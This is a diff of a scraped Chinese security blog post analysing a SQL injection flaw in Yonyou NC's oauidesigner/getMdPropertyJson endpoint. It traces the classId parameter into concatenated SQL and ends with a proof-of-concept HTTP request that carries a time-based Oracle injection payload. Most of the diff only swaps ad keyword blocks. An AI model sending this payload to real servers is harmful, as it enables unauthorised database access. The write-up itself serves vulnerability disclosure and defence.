@@ -7,17 +7,17 @@ asset_dir: assets/用友nc-oauidesignergetmdpropertyjson-sql注入漏洞
 # 用友NC oauidesigner/getMdPropertyJson sql注入漏洞
 
 [Mrxn](https://mrxn.net/author/1)- 发表于2025/2/14 08:12
-- 1204浏览
+- 1205浏览
 - [0评论](#comment)
 - 59分钟阅读
 
 深入探索
 
-Web安全课程
+软件
 
-安全运维咨询
+sql
 
-文本剥离工具
+服务器
 
 ---
 
@@ -46,6 +46,14 @@ NC65
 代码安全审计
 
 nc/bs/oa/oaff/uidesigner/action/TemplatedesignerAction.class
+
+深入探索
+
+Web安全书籍
+
+云安全解决方案
+
+文件大小转换
 
 ```
 package nc.bs.oa.oaff.uidesigner.action;
@@ -126,7 +134,7 @@ public void getMdPropertyJson() throws BusinessException {
 
 classId 参数直接拼接在SQL语句后，代入 getPropertyVOByCondition 函数，其实现逻辑如下
 
-漏洞预警服务
+漏洞修复方案
 
 ```
 public PropertyVO[] getPropertyVOByCondition(String condition) throws CpbBusinessException {
@@ -143,6 +151,8 @@ public PropertyVO[] getPropertyVOByCondition(String condition) throws CpbBusines
 ```
 
 继续代入 queryByCondition 函数，其实现逻辑如下
+
+计算机服务器
 
 ```
 public SuperVO[] queryByCondition(Class voClass, String strWhere) throws DAOException {
@@ -175,7 +185,7 @@ public SuperVO[] queryByCondition(Class voClass, String strWhere) throws DAOExce
 
 strWhere 直接拼接到 and SQL语句后 代入 retrieveByClause 函数
 
-计算机服务器
+SQL注入防护
 
 继续跟踪 retrieveByClause 函数
 
@@ -196,7 +206,7 @@ public Collection retrieveByClause(Class className, String condition, String[] f
 
 最终 classId 参数拼接进SQL语句后由 buildSql 函数组装成SQL语句，最终调用 executeQuery 执行上面组合后的SQL语句，造成SQL注入漏洞。
 
-SQL注入检测工具
+搜索引擎
 
 [![用友NC oauidesigner/getMdPropertyJson sql注入漏洞](images/img-002-d2e23dde263e.webp)](https://image.mrxn.net/f4be200a552149d494d5a66135c58c17.webp)
 
@@ -204,7 +214,7 @@ SQL注入检测工具
 
 > 只是示例
 >
-> 搜索引擎
+> 编程
 
 ```
 GET /portal/pt/oauidesigner/getMdPropertyJson?pageId=login&mdIdMap=1&classId=1'AND+1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',4)-- HTTP/1.1
